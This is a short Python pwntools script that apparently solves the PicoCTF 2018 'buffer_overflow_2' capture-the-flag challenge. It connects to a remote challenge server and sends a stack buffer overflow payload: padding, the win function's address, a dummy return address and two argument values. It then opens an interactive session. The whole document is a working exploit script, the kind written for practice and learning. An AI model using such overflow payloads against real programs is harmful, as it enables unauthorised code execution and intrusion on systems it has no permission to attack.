from pwn import *
#context(log_level='debug')
#io = process("./PicoCTF_2018_buffer_overflow_2")
io = remote("node4.buuoj.cn",27708)
win_addr = 0x080485CB
payload = 'a'*(0x6c+4) +p32(win_addr)+p32(0)+p32(0xDEADBEEF)+ p32(0xDEADC0DE)
io.sendline(payload)
io.interactive()